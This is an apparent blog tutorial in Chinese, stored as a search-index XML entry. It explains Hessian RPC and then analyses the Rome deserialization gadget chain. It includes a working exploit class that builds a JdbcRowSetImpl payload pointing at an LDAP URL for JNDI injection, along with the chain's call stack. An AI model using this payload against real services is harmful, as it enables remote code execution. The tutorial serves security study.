<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java安全之Hessian反序列化链详解</title>
    <url>/2023/11/01/Hessian/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Hessian 是一种基于二进制的轻量级网络传输协议，用于在不同的应用程序之间进行远程过程调用（RPC）。它是由 Caucho Technology 开发的，并在 Java 社区中得到广泛应用。</p>
<p>Hessian 的设计目标是提供一种高效、简单和可移植的远程调用协议。相比于其他文本协议如 XML-RPC 或 SOAP，Hessian 使用二进制格式进行数据序列化和网络传输，可以实现更高的性能和较小的网络传输开销。这也使得 Hessian 在低带宽或高延迟的网络环境下表现出色。</p>
<p>以下是 Hessian 的一些主要特点：</p>
<ol>
<li>轻量级：Hessian 的二进制格式相对较小，占用较少的网络带宽和存储空间，适合于网络传输和数据存储。</li>
<li>跨语言支持：Hessian 不限于特定的编程语言，它提供了多种语言的实现，包括 Java、C#、Python、Ruby 等，因此可以在不同语言之间进行跨平台和跨语言的远程调用。</li>
<li>简单易用：Hessian 提供了简单的 API，使得开发者可以轻松地进行远程调用。开发者只需定义接口和数据类型，然后通过网络进行远程调用，无需手动处理数据序列化和网络传输细节。</li>
<li>高效性能：Hessian 使用二进制格式进行数据序列化和网络传输，相对于文本协议，它具有更高的序列化和反序列化速度，并且在网络传输过程中消耗较少的带宽和资源。</li>
<li>支持各种数据类型：Hessian 支持多种数据类型的序列化和传输，包括基本类型、对象、数组、集合、映射等。</li>
<li>安全性：Hessian 支持基于 SSL&#x2F;TLS 的加密和身份验证，可以确保远程调用的安全性和数据的机密性。</li>
</ol>
<p>在使用 Hessian 进行远程调用时，通常需要在服务端和客户端分别引入相应的 Hessian 库，并且定义接口和数据类型。然后，通过 Hessian 提供的 API 进行远程调用，将请求和响应数据进行序列化和反序列化，并通过网络进行传输。服务端接收到请求后，根据接口定义执行相应的操作，并返回结果给客户端。</p>
<p>总体而言，Hessian 是一种高效、简单和可移植的远程调用协议，适用于构建分布式系统和跨语言应用程序之间的通信。它在许多领域和场景中得到了广泛的应用，例如微服务架构、Web 服务、移动应用程序等。</p>
<h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p><strong>方法一</strong><br>创建一个Hessian服务分为以下四步：<br>第一：创建Java接口作为公共应用程序接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">// API for Basic service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">SayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二： 创建服务实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.server.HessianServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicService</span> <span class="keyword">extends</span> <span class="title class_">HessianServlet</span> <span class="keyword">implements</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">greeting</span> <span class="operator">=</span> <span class="string">&quot;Hello, hessian.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">SayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三：在servlet引擎中配置服务（web.xml）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.example.BasicService<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三：使用HessianProxyFactory创建客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8090/hessian_servlet_war_exploded/hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">HessianProxyFactory</span> <span class="variable">hessianProxyFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProxyFactory</span>();</span><br><span class="line">        <span class="type">Basic</span> <span class="variable">basic</span> <span class="operator">=</span> (Basic) hessianProxyFactory.create(Basic.class, url);</span><br><span class="line"></span><br><span class="line">        System.out.println(basic.SayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端成功向服务端发送请求并接收到响应。<br>参考：<a href="http://hessian.caucho.com/#IntroductiontoHessian">http://hessian.caucho.com/#IntroductiontoHessian</a></p>
<p><strong>方法二</strong><br>服务类可以不继承HessianServlet，直接通过配置文件来设置<br>第一：服务类改成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicService</span> <span class="keyword">implements</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">greeting</span> <span class="operator">=</span> <span class="string">&quot;Hello, hessian.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">SayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二：配置文件改成</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>home-class<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>org.example.BasicService<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>home-api<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>org.example.Basic<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>客户端同样能够成功向服务端发送请求并接收到响应<br>参考：<a href="http://hessian.caucho.com/doc/hessian-overview.xtp">http://hessian.caucho.com/doc/hessian-overview.xtp</a></p>
<h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p>1.创建服务接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.实现服务接口，实现具体的业务逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, Hessian!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.配置 Hessian 服务端：在 Spring 配置文件中配置 Hessian 服务端，将服务接口暴露为 Hessian 服务</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;/myService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.remoting.caucho.HessianServiceExporter&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;service&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;myService&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;serviceInterface&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.example.MyService&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.MyServiceImpl&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上述配置中，<code>org.springframework.remoting.caucho.HessianServiceExporter</code> 是 Spring 提供的 Hessian 服务端导出器，用于将服务接口暴露为 Hessian 服务。<code>name</code> 属性指定了 Hessian 服务的 URL 路径，<code>service</code> 属性引用了实际的服务实现类，<code>serviceInterface</code> 属性指定了服务接口。</p>
<p>4.配置 Hessian 客户端：如果需要从客户端调用远程 Hessian 服务，可以配置 Hessian 客户端。在 Spring 配置文件中添加以下配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myServiceProxy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.remoting.caucho.HessianProxyFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;serviceUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://localhost:8080/myService&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;serviceInterface&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.example.MyService&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上述配置中，<code>org.springframework.remoting.caucho.HessianProxyFactoryBean</code> 是 Spring 提供的 Hessian 客户端代理工厂，用于创建远程服务的代理对象。<code>serviceUrl</code> 属性指定了远程 Hessian 服务的 URL，<code>serviceInterface</code> 属性指定了服务接口</p>
<p>5.使用服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyService myServiceProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> myServiceProxy.sayHello();</span><br><span class="line">    System.out.println(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述代码中，通过注入 <code>MyService</code> 接口的代理对象 <code>myServiceProxy</code>，可以直接调用远程服务的方法。</p>
<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>Hessian2序列化和反序列化过程中的关键类：</p>
<ol>
<li><code>com.caucho.hessian.io.Hessian2Output</code> 和 <code>com.caucho.hessian.io.Hessian2Input</code>：这两个类分别用于将对象序列化为 Hessian2 格式的二进制数据（输出）和将二进制数据反序列化为对象（输入）。它们是 Hessian2 序列化和反序列化的核心类。</li>
<li><code>com.caucho.hessian.io.SerializerFactory</code>：与 Hessian1 类似，<code>SerializerFactory</code> 也是 Hessian2 的序列化工厂。它负责管理和创建序列化器（Serializer）。不同于 Hessian1，Hessian2 的序列化器实现更加灵活，可以通过配置文件或自定义方式进行扩展和定制。</li>
<li><code>com.caucho.hessian.io.Serializer</code>：这是一个抽象类，定义了 Hessian2 序列化和反序列化的方法。具体的对象类型都有对应的实现类，如 <code>com.caucho.hessian.io.StringValueSerializer</code> 用于序列化和反序列化字符串类型的对象。</li>
<li><code>com.caucho.hessian.io.AbstractHessianOutput</code> 和 <code>com.caucho.hessian.io.AbstractHessianInput</code>：这两个抽象类是 <code>Hessian2Output</code> 和 <code>Hessian2Input</code> 的基类，提供了一些公共的方法和功能，如处理引用、处理异常等。</li>
<li><code>com.caucho.hessian.io.HessianProtocolException</code>：这个异常类用于表示在 Hessian2 协议中发生的错误。在反序列化过程中，如果遇到无法解析的数据或格式不正确的数据，就会抛出该异常。</li>
<li><code>com.caucho.hessian.io.JavaSerializer</code>：这个类用于序列化和反序列化 Java 对象。它是 Hessian2 默认的 Java 对象序列化器。</li>
</ol>
<p>准备类：该类继承了Serializable接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>序列化</strong>：使用Hessian2Output的writeObject方法将对象序列化为二进制数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;aaa&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        hessian2Output.writeObject(stu);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">        System.out.print(byteArrayOutputStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>反序列化</strong>：使用Hessian2Input的readObject方法将二进制数据反序列化为对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 先序列化</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;lucy&quot;</span>, <span class="number">23</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        hessian2Output.writeObject(student);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">student1</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        System.out.println(student1.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="Rome利用链"><a href="#Rome利用链" class="headerlink" title="Rome利用链"></a>Rome利用链</h2><h3 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JdbcRowSetImpl.getDatabaseMetaData()</span><br><span class="line">ToStringBean.toString() (com.sun.syndication.feed.impl)</span><br><span class="line">EqualsBean.beanHashCode() (com.sun.syndication.feed.impl)</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">HashMap.hash()</span><br><span class="line">HashMap.put()</span><br><span class="line">MapDeserializer.readMap()</span><br><span class="line">SerializerFactory.readMap()</span><br><span class="line">Hessian2Input.readObject()</span><br></pre></td></tr></table></figure>

<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dili.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeHessian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// ldap url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/czhupn&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建JdbcRowSetImpl对象</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建toStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ObjectBean</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JavaSec/out/RomeHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);</span><br><span class="line">        hessian2Output.writeObject(hashMap);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JavaSec/out/RomeHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">538</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2110</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">40</span>, RomeHessian (org.dili.hessian)</span><br></pre></td></tr></table></figure>

<h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p><strong>注</strong>：调试时只需要保持反序列化部分即可</p>
<p>从Hessian2Input的readObject方法开始，先解释该方法</p>
<blockquote>
<p>Hessian2Input类的readObject()方法是Hessian协议中用于反序列化二进制数据的核心方法。它的作用是将二进制数据流转换为对应的Java对象。</p>
<p>详细过程：</p>
<ol>
<li>读取类型标识符：readObject()方法首先从输入流中读取类型标识符。该标识符用于确定接下来要反序列化的对象的类型。</li>
<li>创建对象：根据类型标识符，Hessian2Input会创建对应的Java对象。它使用Java的反射机制，在运行时动态地创建对象实例。</li>
<li>读取对象字段：一旦对象被创建，Hessian2Input会读取对象的字段信息，包括字段名和字段值。它会递归地读取对象的所有字段，直到读取完所有字段或遇到引用（reference）。</li>
<li>处理引用：在读取字段过程中，如果遇到引用（reference），Hessian2Input会返回之前已经读取过的对象，而不是重新创建新的对象。这样可以确保对象的引用关系在反序列化后得到正确的恢复。</li>
<li>返回对象：当所有字段都被读取完毕，Hessian2Input会返回反序列化后的Java对象。</li>
</ol>
</blockquote>
<p>进入该方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果当前已经读取的数据长度_offset小于数据总长度_length，则从内部缓冲区_buffer中获取一个字节，否则调用read()方法从输入流中读取一个字节</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">tag</span> <span class="operator">=</span> _offset &lt; _length ? (_buffer[_offset++] &amp; <span class="number">0xff</span>) : read();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tag) &#123;</span><br><span class="line">    <span class="comment">// 空对象</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 布尔True</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> Boolean.valueOf(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 布尔False</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> Boolean.valueOf(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">    <span class="comment">// Map对象</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">      